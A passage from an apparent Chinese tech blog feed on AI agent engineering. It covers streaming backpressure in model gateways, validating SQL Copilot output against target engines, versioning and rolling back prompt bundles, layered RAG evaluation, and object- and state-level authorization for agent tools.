<h2 id="背压从浏览器一直传到供应商"><a href="#背压从浏览器一直传到供应商" class="headerlink" title="背压从浏览器一直传到供应商"></a>背压从浏览器一直传到供应商</h2><p>浏览器消费慢、WebSocket&#x2F;SSE 下游堵塞时，网关不能无限缓存模型事件。每条流设置有界队列和最大累计字节；超过阈值可以暂停读取、丢弃仅用于 UI 的细粒度刷新，或取消请求，但不能悄悄丢模型内容。</p>
<p>对 UI 可合并相邻 text deltas，每 30 到 50ms 刷新一次，减少渲染频率；审计轨仍保存原始事件顺序或至少保存无损合并结果。工具、错误和终态事件不参与文本合并。</p>
<p>慢消费者指标要独立：provider first-token latency、provider inter-event gap、gateway queue time、client send time。只看端到端延迟，无法判断是模型慢还是前端渲染&#x2F;网络回压。</p>
<p>多租户网关还要限制并发流和每连接缓冲。一个长时间不读的客户端不能拖垮事件循环或占满内存。清理路径覆盖正常终止、异常、取消和客户端消失，确保计数器与连接句柄最终释放。</p>
<h2 id="Raw-Event-与最终文本都要保存"><a href="#Raw-Event-与最终文本都要保存" class="headerlink" title="Raw Event 与最终文本都要保存"></a>Raw Event 与最终文本都要保存</h2><p>只保存最终拼接文本，遇到少字、重复、工具参数损坏时无法复现。我会保存 request metadata、原生事件序列或受控采样、归一化事件、归并器版本和最终结果 hash。</p>
<p>测试用例从真实故障形态来：一个 JSON 跨三个 TCP chunks、两个 SSE events 在一个 chunk、多字节中文被拆开、空 delta、函数参数逐字符到达、终态缺失、重复 event、客户端中途取消。对同一字节序列随机重新分片，解析结果必须完全相同。</p>
<p>还要断言不变量：seq 单调、终态最多一个、终态后不再接受内容、completed 时 JSON 参数可解析、最终文本等于所有有效 delta 有序拼接、raw 与 normalized 都能通过 request ID 找到。</p>
<p>流式协议的难点不在“边生成边展示”，而在面对任意分片、乱序风险和不完整结束时仍给出确定状态。把三层边界拆开并保留事件证据，才能让模型网关在高并发和故障场景下不丢字、不重复执行工具，也不把半个回答伪装成成功。</p>
<h2 id="对照规范与官方资料"><a href="#对照规范与官方资料" class="headerlink" title="对照规范与官方资料"></a>对照规范与官方资料</h2><ul>
<li><a href="https://html.spec.whatwg.org/multipage/server-sent-events.html">WHATWG Server-Sent Events：事件流格式、data&#x2F;id 字段与 UTF-8 解析</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023-06-13 Function Calling：模型返回函数名与 JSON arguments</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc9110">RFC 9110：HTTP 状态与消息语义</a></li>
<li><a href="https://www.unicode.org/reports/tr29/">Unicode Standard Annex #29：文本边界不能用任意字节切分推断</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>模型网关</tag>
        <tag>流式协议</tag>
        <tag>SSE</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL Copilot 生成之后怎么验：Parser、Catalog、Planner 缺一层都不够</title>
    <url>//2023/08/06/sql-copilot-engine-validation/</url>
    <content><![CDATA[<p>SQL Copilot 最容易做成“代码补全器”：模型返回 SQL，编辑器高亮一下，用户自己运行。到了需要自动修复、自动解释或一键执行的场景，这个边界就不够了。模型写出的 SQL 往往像标准 SQL，真正交给 Flink、Spark、Hive 或 PostgreSQL 时，方言、Catalog 和执行计划都会给出不同结论。</p>
<p>我把验证分成三段：目标引擎 Parser 证明语句属于这个方言，Catalog&#x2F;Analyzer 证明对象和类型能解析，Planner&#x2F;受控执行证明计划风险和结果语义可接受。任何一段失败，都返回具体证据，而不是笼统说“SQL 可能有问题”。</p>
<p class="article-diagram-scroll"><img src="/images/articles/sql-copilot-engine-validation.svg" class="lazyload" data-srcset="/images/articles/sql-copilot-engine-validation.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="SQL Copilot 的三段验证"></p>
<span id="more"></span>

<h2 id="通用-Parser-不能替代目标引擎"><a href="#通用-Parser-不能替代目标引擎" class="headerlink" title="通用 Parser 不能替代目标引擎"></a>通用 Parser 不能替代目标引擎</h2><p>同一个 <code>MERGE</code>、窗口函数、日期表达式或引号规则，在不同引擎和版本里支持程度不同。用一个通用 SQL parser 检查通过，只能证明它符合该 parser 的语法，不代表目标集群能执行。</p>
<p>验证请求必须绑定 <code>engine_type + engine_version + dialect_config</code>。平台调用与线上相同版本的 parser，或调用目标引擎提供的 parse&#x2F;prepare 接口。无法精确匹配版本时要标出限制，不能用最新 parser 给旧集群签发“语法正确”。</p>
<p>Parser 阶段还负责限制语句形态：只允许单 statement、禁止未授权 DDL&#x2F;DML、识别注释与多语句分隔、提取 AST 中的表、列、函数和 hint。正则搜索 <code>DROP</code> 或判断 SQL 以 SELECT 开头，处理不了 CTE、嵌套查询和方言扩展。</p>
<p>Flink SQL 的 EXPLAIN 输入最终由自身 parser&#x2F;planner 处理，Spark SQL 也有独立 parser 与 logical plan。SQL Copilot 若声称支持多个引擎，应该把这些真实解析链路作为适配器，而不是让模型在 Prompt 里“注意方言”。</p>
<h2 id="Catalog-Analyzer-才知道对象是否成立"><a href="#Catalog-Analyzer-才知道对象是否成立" class="headerlink" title="Catalog&#x2F;Analyzer 才知道对象是否成立"></a>Catalog&#x2F;Analyzer 才知道对象是否成立</h2><p>语法正确的 <code>SELECT amount FROM orders</code> 仍可能引用不存在的列、错误 database、不可见的临时 view，或把 STRING 与 TIMESTAMP 比较。Analyzer 需要当前 Catalog、search path、函数注册和会话配置才能解析。</p>
<p>上下文中给模型的 schema 是生成依据，执行前检查用的 Catalog 才是事实。两者版本不一致时，返回 <code>METADATA_STALE</code>，附模型使用版本与当前版本。不要看到字段不存在就让模型无限重写，因为问题可能是缓存陈旧，而不是生成能力。</p>
<p>对象解析结果保存稳定 ID 和完全限定名。同名表在不同 catalog&#x2F;schema 下不能依赖默认 search path；生产和测试的默认库也不应共用。最终 SQL 可由平台补全限定名，但原候选与重写结果都进入审计。</p>
<p>类型检查要关注隐式转换。引擎允许 STRING 到数字的宽松转换，不代表业务上安全；日期格式错误可能变 null 而不是报错。关键字段建立 stricter rules，例如时间范围必须显式时区，金额不允许浮点隐式比较，分区字段必须有可下推谓词。</p>
<h2 id="EXPLAIN-是风险检查，不是正确性证明"><a href="#EXPLAIN-是风险检查，不是正确性证明" class="headerlink" title="EXPLAIN 是风险检查，不是正确性证明"></a>EXPLAIN 是风险检查，不是正确性证明</h2><p>Planner 能发现全表扫描、笛卡尔积、Join 顺序、Exchange、广播、状态保留和无法下推的过滤。它适合阻止明显危险查询，也能给 SQL 优化建议提供证据。</p>
<p>Flink 的 EXPLAIN 会展示 AST、optimized physical plan 和 execution plan，不同 detail 还能输出 changelog mode、estimated cost 等信息。Spark 的 <code>EXPLAIN</code> 可以输出 parsed&#x2F;analyzed&#x2F;optimized logical plan 与 physical plan。平台应保存原始 plan 和解析后的关键特征，不能只让模型读一大段文本自行判断。</p>
<p>风险规则按引擎区分。批任务关注 scanned partitions、shuffle、Join build side 和小文件；流任务还要检查无界 Join、state TTL、changelog 兼容和 sink 语义。把“没有全表扫描”当统一安全标准，会漏掉流作业无限状态增长。</p>
<p>EXPLAIN 依赖统计信息。estimated rows 不准时，规则只能给风险提示，不能伪装成精确成本。报告要区分 planner fact、统计估算和平台推断。</p>
<h2 id="受控执行补上数据语义"><a href="#受控执行补上数据语义" class="headerlink" title="受控执行补上数据语义"></a>受控执行补上数据语义</h2><p>Parser、Analyzer、Planner 全通过，SQL 仍可能在业务粒度上错。退款明细一对多导致金额翻倍，时间字段选错导致少一天，<code>COUNT(*)</code> 与 <code>COUNT(DISTINCT user_id)</code> 都不会触发语法或计划错误。</p>
<p>受控执行使用固定快照或隔离样本，设置只读、超时、资源组与结果限制。验证中间行数：每次 Join 前后 cardinality、聚合前后粒度、过滤命中分区和关键 null ratio。对认证指标，与基准 SQL 在同一快照做差异比较。</p>
<p><code>LIMIT 100</code> 只限制结果，不必然限制扫描。小样本最好来自确定性分区或采样表，并记录它覆盖了哪些数据特征。随机抽样每次不同，会让回归结果漂移；只抽头部数据，又可能错过 null、倾斜和边界日期。</p>
<p>结果断言不是写死一个数。可以断言唯一键、非负、枚举范围、分项与总量关系、两个实现差异在容差内。真实值随快照变化，但这些不变量仍能发现结构性错误。</p>
<h2 id="修复建议要带证据和验证状态"><a href="#修复建议要带证据和验证状态" class="headerlink" title="修复建议要带证据和验证状态"></a>修复建议要带证据和验证状态</h2><p>SQL Copilot 说“增加分区过滤可以提升性能”没有行动价值。建议应指出哪个 scan 未命中 partition pruning、当前扫描多少分区、可用分区列是什么，并给出修改前后 plan diff。</p>
<p>自动改写后重新走完整三段验证。只看新 SQL 能解析，可能为了修复一个函数又引入对象或语义变化。输出区分 <code>generated</code>、<code>parsed</code>、<code>analyzed</code>、<code>planned</code>、<code>executed</code>、<code>asserted</code>，用户一眼知道验证到了哪层。</p>
<p>不能执行时也要诚实。生产库无只读沙箱，系统最多验证到 plan；统计信息缺失，成本只是推断；没有认证口径，结果语义需人工确认。比一个笼统的“已优化”更能建立信任。</p>
<p>日志记录模型输入的 schema version、候选 SQL、目标引擎版本、每层错误、最终改写与 plan hash。用户接受&#x2F;拒绝建议进入回归集，按 parser、catalog、plan、semantic 分类，不把所有失败都归到模型。</p>
<p>SQL Copilot 真正有价值的地方，不是比人更快写出几十行 SQL，而是把目标引擎已有的解析、元数据和计划能力接进生成闭环。模型提出候选，引擎提供事实，验证器给出边界，最终交付才是一条可以负责的查询。</p>
<h2 id="对照官方资料"><a href="#对照官方资料" class="headerlink" title="对照官方资料"></a>对照官方资料</h2><ul>
<li><a href="https://github.com/apache/flink/blob/c41c8e5cfab683da8135d6c822693ef851d6e2b7/docs/content/docs/dev/table/sql/explain.md">Apache Flink 1.15.3：SQL <code>EXPLAIN</code> 与 plan details</a></li>
<li><a href="https://github.com/apache/spark/blob/fbbcf9434ac070dd4ced4fb9efe32899c6db12a9/docs/sql-ref-syntax-qry-explain.md">Apache Spark 3.3.1：SQL <code>EXPLAIN</code> 语法与 parsed&#x2F;analyzed&#x2F;optimized&#x2F;physical plans</a></li>
<li><a href="https://www.postgresql.org/docs/15/sql-explain.html">PostgreSQL 15：<code>EXPLAIN</code> 的计划、执行与 BUFFERS 语义</a></li>
<li><a href="https://arxiv.org/abs/1809.08887">Spider：跨领域复杂 text-to-SQL 的 schema 与 SQL 评测</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>SQL 验证</tag>
        <tag>SQL Copilot</tag>
        <tag>查询引擎</tag>
      </tags>
  </entry>
  <entry>
    <title>Prompt 也要版本、灰度和回滚：真正需要冻结的是运行组合</title>
    <url>//2023/08/11/prompt-version-and-rollback/</url>
    <content><![CDATA[<p>Prompt 从十几行增长到几百行后，很容易变成一份“谁都能改、没人敢删”的线上配置。有人为了修一个格式问题加两句指令，第二天工具选择率下降；回滚时只把文本改回去，结果仍和上周不同，因为模型别名、工具 schema 或检索模板已经变了。</p>
<p>我不把 Prompt 单独视为版本单位。真正决定一次模型行为的是完整运行组合：system prompt、消息模板、模型 snapshot、sampling 参数、工具定义、检索&#x2F;上下文策略和输出 parser。它们一起形成不可变 Bundle，发布与回滚都指向 Bundle ID。</p>
<p class="article-diagram-scroll"><img src="/images/articles/prompt-version-and-rollback.svg" class="lazyload" data-srcset="/images/articles/prompt-version-and-rollback.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Prompt 变更按软件版本发布"></p>
<span id="more"></span>

<h2 id="文本版本不等于行为版本"><a href="#文本版本不等于行为版本" class="headerlink" title="文本版本不等于行为版本"></a>文本版本不等于行为版本</h2><p>同一 Prompt 发给 <code>gpt-4</code> 通用别名，供应商升级后输出可能变化。OpenAI 2023 年 6 月的发布说明明确提到新模型版本可能在部分任务上退化，并提供固定 snapshot 名称，让应用可以 pin 版本。</p>
<p>工具描述变化也会影响选择。把 <code>get_job</code> 的 description 改得更宽泛，模型可能在无需工具时调用它；新增 required 字段后，旧 few-shot 的参数样例又不再合法。检索 top-k 或 chunk template 改动，会改变模型实际看到的事实。</p>
<p>因此一次运行至少记录：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">bundle_id / content_hash</span><br><span class="line">model_provider / model_snapshot / parameters</span><br><span class="line">system_prompt_version / template_version</span><br><span class="line">tool_registry_version / schema hashes</span><br><span class="line">retrieval_policy_version / index_version</span><br><span class="line">output_parser_version / policy_version</span><br></pre></td></tr></table></figure>

<p>Bundle 创建后不可原地编辑。配置中心的 <code>prod</code> 只是指向某个 Bundle 的别名，切换别名才是发布动作。历史请求永远能找到当时组合，不会因为模板被覆盖而无法复现。</p>
<h2 id="变更必须写清假设"><a href="#变更必须写清假设" class="headerlink" title="变更必须写清假设"></a>变更必须写清假设</h2><p>“优化 Prompt”不是可验收的变更说明。提交时要写：观察到什么失败、准备修改哪一段、为什么能影响这个失败、可能伤害哪些场景、用哪些指标验收。</p>
<p>例如修复工具参数缺日期：在 system prompt 增加日期解析规则，预期 <code>MISSING_REQUIRED_FIELD</code> 下降；风险是模型把模糊“最近”猜成具体范围，需同时观察追问率和错误日期率。这样评审者能判断方案是否对因，也知道回归关注什么。</p>
<p>Prompt 存入 Git 适合代码评审和 diff，但线上配置还需要构建产物。构建时解析 include、变量和工具 schema，生成 canonical JSON，再计算 hash。只对源文件 hash，无法覆盖依赖模板变化；只存渲染文本，又失去模块来源。</p>
<p>敏感信息不进入 Prompt 仓库。环境地址、token 和租户数据由运行时安全注入，并在 Bundle manifest 中只记录 secret reference。回放环境使用测试凭据，不能因为复现 Prompt 把生产秘密带出来。</p>
<h2 id="离线评测分能力与守门用例"><a href="#离线评测分能力与守门用例" class="headerlink" title="离线评测分能力与守门用例"></a>离线评测分能力与守门用例</h2><p>回归集来自真实失败，按正常能力、拒答、安全、工具边界和格式解析分组。新 Bundle 不只要提高目标指标，还必须通过守门用例：越权请求仍拒绝、高风险动作仍确认、无证据时不编造、输出仍能被 parser 接受。</p>
<p>评测输入固定 user messages、授权上下文、检索结果或 tool mocks。若一边改 Prompt 一边换索引，结果无法归因。需要验证全组合时，再做独立端到端集，明确这是综合发布而非 Prompt 单变量实验。</p>
<p>生成有随机性，单条跑一次没有统计意义。关键用例重复运行，比较成功率、错误类型、token 和 latency 分布。对严格 JSON&#x2F;工具参数可以做确定断言；自然语言答案用事实点、引用和禁用内容断言，不依赖逐字相同。</p>
<p>评测结果绑定 Bundle hash。后来修改了同名文件，旧报告不能继续显示为“已通过”。发布系统只接受当前 hash 的报告，并记录评测代码&#x2F;数据集版本。</p>
<h2 id="灰度要固定分流并保留旧结果"><a href="#灰度要固定分流并保留旧结果" class="headerlink" title="灰度要固定分流并保留旧结果"></a>灰度要固定分流并保留旧结果</h2><p>离线通过后先影子运行：真实请求仍由旧 Bundle 服务，新 Bundle 在合规范围内异步执行，结果不展示给用户。比较工具选择、错误、答案断言、延迟和成本，发现只在真实分布出现的问题。</p>
<p>进入灰度时按 user&#x2F;session hash 固定分流，避免同一会话前后使用不同 Prompt。Agent 有历史上下文时，Bundle ID 应绑定整个 run，不能在工具调用一半切版本。</p>
<p>旧、新链路记录相同观测字段。只比较点赞率容易受用户分布干扰，还要看 refusal、tool error、invalid output、human correction、cost 和 p95 latency。高风险失败设绝对阈值，一旦出现立即停止灰度，不等总体平均值。</p>
<p>影子调用会增加成本和数据处理范围，需要明确采样率、脱敏和保留策略。不能为了实验把原本不出域的数据发给另一个供应商。</p>
<h2 id="回滚不是改回一段文字"><a href="#回滚不是改回一段文字" class="headerlink" title="回滚不是改回一段文字"></a>回滚不是改回一段文字</h2><p>回滚动作把 <code>prod</code> alias 原子指回上一个已验证 Bundle。正在执行的 run 继续使用启动时版本，新 run 使用回滚版本；否则一个 Agent loop 中前后工具描述不同，状态无法解释。</p>
<p>数据库 schema、工具后端或索引若已做不可兼容变更，旧 Bundle 可能无法运行。因此发布前要声明兼容窗口：新工具 schema 至少支持旧 Bundle 一段时间，索引 alias 保留旧版本，output storage 能识别两版事件。</p>
<p>回滚触发条件预先定义，例如 invalid tool arguments 连续超过阈值、权限守门用例失败、完成率下降、成本增长超过预算。人工也可回滚，但必须填写 incident&#x2F;reference，不能在配置中心手改一段 Prompt 后绕过审计。</p>
<p>回滚后保留失败 Bundle 和请求证据，分析完成再建新版本。禁止覆盖原 Bundle“修一下再发”，否则事故现场消失，评测报告与产物 hash 也对不上。</p>
<h2 id="线上每次回答都能定位版本"><a href="#线上每次回答都能定位版本" class="headerlink" title="线上每次回答都能定位版本"></a>线上每次回答都能定位版本</h2><p>响应 metadata 和 trace 包含 Bundle ID、model snapshot、tool registry&#x2F;index&#x2F;parser 版本。用户反馈某次答案错误时，可以直接抽取同一组合回放，而不是先猜当天谁改过 Prompt。</p>
<p>对于流式响应，版本在首个事件前确定并贯穿全流；重试创建新 attempt，但默认沿用同一 Bundle。若因模型不可用切换 fallback，要生成明确 route event，最终结果标注实际组合，不能继续冒充原版本。</p>
<p>版本管理不会让模型行为变成完全确定，但能把变化范围收窄到可分析。Prompt 工程进入生产后，最重要的能力不是写出一段永远正确的指令，而是知道哪次改变带来了什么效果，退化时可以在几分钟内回到已验证状态。</p>
<h2 id="对照官方资料"><a href="#对照官方资料" class="headerlink" title="对照官方资料"></a>对照官方资料</h2><ul>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023-06-13 API 更新：固定模型 snapshot 与版本升级边界</a></li>
<li><a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Objects：内容寻址对象与不可变对象模型</a></li>
<li><a href="https://semver.org/spec/v2.0.0.html">Semantic Versioning 2.0.0：版本与兼容性约定</a></li>
<li><a href="https://github.com/openai/evals">OpenAI Evals：面向模型行为的开源评测框架</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Prompt 工程</tag>
        <tag>版本管理</tag>
        <tag>发布治理</tag>
      </tags>
  </entry>
  <entry>
    <title>RAG 评测为什么要拆开：没召回证据与没用好证据不是一种错</title>
    <url>//2023/09/26/retrieval-evaluation-split/</url>
    <content><![CDATA[<p>RAG 团队常用一张端到端准确率报表：问题发进去，答案对就记 1，错就记 0。这个数适合看整体趋势，却不能告诉我们该改 embedding、chunking、reranker、Prompt 还是知识源。</p>
<p>我会把评测拆成三层。第一层只测检索是否拿到充分证据；第二层固定正确证据，只测模型能否组织出正确、受引用支持的答案；第三层才跑真实端到端链路，验证两者组合后的延迟、成本和失败分布。</p>
<p class="article-diagram-scroll"><img src="/images/articles/retrieval-evaluation-split.svg" class="lazyload" data-srcset="/images/articles/retrieval-evaluation-split.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="检索与回答分开评测，失败才能归因"></p>
<span id="more"></span>

<h2 id="数据集不能只有问题和标准答案"><a href="#数据集不能只有问题和标准答案" class="headerlink" title="数据集不能只有问题和标准答案"></a>数据集不能只有问题和标准答案</h2><p>一条 RAG 样本至少需要 question、supporting source spans、answer assertions、权限身份、知识时间和不可接受答案。只写一个标准答案字符串，无法判断检索到了哪份证据，也无法容纳多个正确表达。</p>
<p>supporting span 应是最小充分证据。问题有两个条件，就标注能共同支持结论的多个片段；不是把整篇文档都当 gold。允许多个来源时保存 evidence groups，命中任一完整组都算充分，不强迫系统找同一份文档。</p>
<p>答案用事实断言而非逐字比对。例如必须包含数值 30、单位 day、范围 production job，并引用当前制度版本；禁止把测试环境值 7 当结论。这样模型换一种自然表达也能通过，漏掉适用条件仍会失败。</p>
<p>身份和时间不能省。管理员与普通用户的 gold evidence 不同，2022 年制度与当前制度也不同。离线集若不固定 policy snapshot 和 knowledge snapshot，今天重跑找到了更新文档，会被误判为模型进步。</p>
<h2 id="Retrieval-先测“拿到了什么”"><a href="#Retrieval-先测“拿到了什么”" class="headerlink" title="Retrieval 先测“拿到了什么”"></a>Retrieval 先测“拿到了什么”</h2><p>DPR、BEIR 等检索工作常用 recall@k、MRR、nDCG。企业 RAG 可以借这些指标，但 relevance 要从“主题相关”升级到“是否足以支持答案”。</p>
<p>Recall@k 检查 top-k 是否包含所有必要 evidence；MRR 关注首个有效证据位置；nDCG 可以表达多级相关性。除此之外，我会加三项：充分证据率、噪声 token 比、权限违规率。</p>
<p>一段谈同一主题却缺关键限制，只能算 partial relevant。它可能提高传统 recall，却让生成模型更容易给出过度结论。充分证据率直接要求条件和结论齐全。噪声 token 比反映 top-k 中无关&#x2F;重复内容占用了多少上下文。</p>
<p>权限违规率必须为零。越权 chunk 即使最终答案没引用，也说明检索前过滤失效。不能拿“模型没有说出来”抵消召回泄露。</p>
<p>检索实验固定 query normalization、index snapshot、embedding、filter、top-k 与 reranker 版本。只改一个变量，失败样本按 query understanding、filter、chunk、embedding、rerank、freshness 分类。平均 recall 提升时，关键制度类样本不能退化。</p>
<h2 id="固定证据后再测-Answer"><a href="#固定证据后再测-Answer" class="headerlink" title="固定证据后再测 Answer"></a>固定证据后再测 Answer</h2><p>第二层绕过检索，直接把标注 evidence 交给模型。此时答错说明问题主要在 Prompt、上下文组织、模型能力或输出验证，不应该去调向量索引。</p>
<p>回答指标包括事实正确性、条件完整性、引用支持度、冲突处理和拒答。引用支持不是“答案里有链接”，而是每个关键 claim 能映射到支持它的 span。模型写了证据没有包含的因果解释，即使结论数字正确，也要标 unsupported claim。</p>
<p>证据冲突样本单独准备。两份制度版本、不同环境或来源等级冲突时，预期行为可能是选择当前认证版本，也可能是显示冲突并请求确认。让评测器只判断最终一句话，会漏掉治理规则。</p>
<p>无答案样本同样重要。提供相关但不充分的片段，验证模型是否拒答并指出缺什么。只有答案题的评测会训练团队一味追求回答率，把诚实的“不确定”当失败。</p>
<p>自动评审可以辅助，但关键样本要用确定断言和人工复核。让另一个模型给所有答案打一个 1 到 5 分，仍可能受表达、顺序和自身知识影响。评审 Prompt、模型和版本也要进入结果记录。</p>
<h2 id="端到端层验证组合与运行条件"><a href="#端到端层验证组合与运行条件" class="headerlink" title="端到端层验证组合与运行条件"></a>端到端层验证组合与运行条件</h2><p>前两层通过后跑完整链路。这里关注 retrieval 与 generation 的交互：top-k 顺序是否影响引用，邻接扩展是否超 token，权限过滤后证据是否不足，生成是否在流式中完整结束。</p>
<p>端到端指标除了答案质量，还包括检索&#x2F;首 token&#x2F;总延迟、input&#x2F;output tokens、重排成本、拒答率、错误率与每成功答案成本。一个准确率提高 1% 但成本增长 5 倍的配置，是否发布取决于场景价值。</p>
<p>线上 trace 记录候选、分数、过滤、最终上下文、模型输出和引用。用户反馈后能自动归类：gold evidence 不在 top-k 是 retrieval miss；已在上下文但未使用是 answer miss；知识本身错误是 source miss；请求中途断流是 system failure。</p>
<p>这种分类不是为了甩锅，而是让修复落到正确环节。source miss 交给知识 owner，retrieval miss 调索引，answer miss 改 Prompt&#x2F;模型，system failure 修协议或运行时。</p>
<h2 id="数据集要跟着线上失败生长"><a href="#数据集要跟着线上失败生长" class="headerlink" title="数据集要跟着线上失败生长"></a>数据集要跟着线上失败生长</h2><p>公开基准能比较通用检索能力，无法覆盖企业表名、制度版本、权限和业务口径。上线初期从搜索日志、人工问答和工单整理小而硬的集合，比造几千个模板问题更有价值。</p>
<p>每个生产错误先保存完整证据，去敏后由 owner 标注正确 source 与 answer assertions，再进入对应 failure bucket。相似问题去重，避免一次热点事故占据整个评测集；高风险问题赋更高权重，但仍展示各桶原始通过率。</p>
<p>数据集版本不可变，新增样本发布新版本。报表同时展示固定基准趋势和最新失败集趋势：前者防止历史回归，后者反映系统是否学会解决新问题。只在不断变化的集合上比较，总分没有可解释性。</p>
<p>测试环境固定 index&#x2F;knowledge snapshot。若要评估新鲜度同步，建立专门的 temporal test：源文档在 T1 更新，测 T2 索引可见、旧版本不可见和答案切换，而不是把更新混进普通准确率。</p>
<h2 id="发布门槛要看错误类型"><a href="#发布门槛要看错误类型" class="headerlink" title="发布门槛要看错误类型"></a>发布门槛要看错误类型</h2><p>不是所有指标都可以平均。权限泄露、错误执行建议和伪造引用属于零容忍守门项；普通描述不够简洁可以接受一定波动。发布规则按风险设绝对阈值，再看整体收益。</p>
<p>我会生成一张 failure matrix：行是样本类型，列是 source&#x2F;retrieval&#x2F;answer&#x2F;system。每次 Bundle 变更展示新增失败、已修复失败与未变化失败。评审者能看到“总分 +2”背后是否用三个安全退化换来几十个简单问题提升。</p>
<p>RAG 评测拆层之后，团队不再围着一个准确率猜原因。证据没进上下文就修检索，证据在但答案没用好就修生成，知识本身缺失就回到治理。端到端指标仍重要，但它应该是最后验收，不是唯一诊断工具。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2004.04906">Dense Passage Retrieval：稠密检索与 top-k passage 评测</a></li>
<li><a href="https://arxiv.org/abs/2104.08663">BEIR：覆盖多类检索任务的异构 benchmark</a></li>
<li><a href="https://arxiv.org/abs/2009.02252">KILT：知识密集任务、答案与 provenance 的联合评测</a></li>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：检索与生成的联合模型</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>可观测性</tag>
        <tag>RAG 评测</tag>
        <tag>信息检索</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 工具权限不能停在“允许调用”：动作、对象和状态要一起判断</title>
    <url>//2023/10/27/agent-tool-object-permission/</url>
    <content><![CDATA[<p>给 Agent 配一份“可用工具列表”，只能说明模型可以看到哪些函数，不能说明用户有权对哪些对象做什么。一个用户能调用 <code>rerun_job</code>，不代表他能重跑所有项目、所有环境的任务；能调用 <code>query_table</code>，也不代表能读每张表的每个字段。</p>
<p>我把工具权限表达为 <code>subject × action × resource × context</code>。主体来自可信会话，动作来自已注册工具，对象必须解析为稳定 ID，上下文包含租户、环境、时间和资源当前状态。模型只提出参数，不参与最终授权结论。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-tool-object-permission.svg" class="lazyload" data-srcset="/images/articles/agent-tool-object-permission.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 工具权限落到动作与对象"></p>
<span id="more"></span>

<h2 id="工具可见性只是第一层收敛"><a href="#工具可见性只是第一层收敛" class="headerlink" title="工具可见性只是第一层收敛"></a>工具可见性只是第一层收敛</h2><p>根据用户角色只向模型暴露必要工具，能减少误选和 Prompt 注入后的攻击面。只读用户看不到 delete、publish、send 等工具，模型就少了一条危险路径。但隐藏 schema 不是安全边界，攻击者仍可能直接调用后端接口。</p>
<p>每个工具服务必须再次鉴权。调用携带由网关签名的 subject context，包括 user ID、tenant、session、auth time 和 delegation scope。模型生成的 arguments 中即使有 <code>user_id=admin</code>，也不能改变主体。</p>
<p>服务账户只代表 Agent runtime，不代表最终用户。后端策略同时检查 caller service 和 delegated user：服务是否允许调用此 API，用户是否允许执行此 action。任何一层不通过都拒绝，并记录 policy decision ID。</p>
<p>工具注册表标明风险等级和权限动作，例如 <code>job:read</code>、<code>job:rerun</code>、<code>job:stop</code>。不要把同一个 <code>job:write</code> 粗权限覆盖所有操作。停止运行实例与修改调度配置的风险和 owner 范围并不相同。</p>
<h2 id="对象名称必须先解析成唯一身份"><a href="#对象名称必须先解析成唯一身份" class="headerlink" title="对象名称必须先解析成唯一身份"></a>对象名称必须先解析成唯一身份</h2><p>用户说“重跑订单同步”，系统可能找到测试与生产两个同名任务。模型根据上下文猜生产对象，再通过权限检查，也可能因为用户恰好有两边权限而执行错误目标。</p>
<p>动作工具只接受 immutable resource ID 和 expected version。名称、别名、路径先交给只读 resolve 工具，返回候选的项目、环境、owner 与状态。只有一个高置信候选且策略允许时才能继续；否则把歧义展示给用户。</p>
<p>对象解析也受权限过滤。不能先返回全公司同名任务，再让用户选，因为候选列表本身可能泄露项目。resolve 服务在当前 subject scope 内搜索，响应说明是否因无权而隐藏细节时要谨慎，不暴露对象是否存在。</p>
<p>层级对象要处理继承。用户有项目权限，不一定自动拥有生产环境变更权；表级 SELECT 也不能推出关联存储路径访问权。策略显式编码继承和 deny precedence，不让模型根据组织常识推断。</p>
<h2 id="当前状态是授权条件的一部分"><a href="#当前状态是授权条件的一部分" class="headerlink" title="当前状态是授权条件的一部分"></a>当前状态是授权条件的一部分</h2><p>同一个动作在不同状态下风险不同。重跑一个已失败的离线实例可能允许自助；重跑仍在运行的实例会产生并发写；停止核心日结任务可能需要值班审批。</p>
<p>策略判定读取资源 current version&#x2F;state，并把它写入 decision。执行时工具用 compare-and-set 再检查 expected version，防止授权后对象发生变化。预览时任务是 FAILED，真正执行前已被其他人重跑到 RUNNING，就应返回 <code>STATE_CONFLICT</code>，不能沿用旧授权。</p>
<p>时间和环境也进入 context。生产发布只在变更窗口内允许，紧急窗口需要 incident ID；跨地域数据查询受 data residency 约束。模型不负责判断“现在是否紧急”，它只能传递由外部系统确认的工单或审批引用。</p>
<p>策略结果给出 allow&#x2F;deny、reason code、obligations 与 expiry。obligations 可能是二次确认、脱敏、限行或审批。执行器必须落实这些义务，不能只读取 allow 布尔值。</p>
<h2 id="用户确认需要绑定计划"><a href="#用户确认需要绑定计划" class="headerlink" title="用户确认需要绑定计划"></a>用户确认需要绑定计划</h2><p>高风险工具先返回 dry-run plan：将对哪个资源、哪个版本、执行什么动作、影响哪些下游、预计资源和可回滚方式。用户确认后，系统签发包含 subject、action、resource ID、expected version、normalized arguments hash 和 expiry 的 approval token。</p>
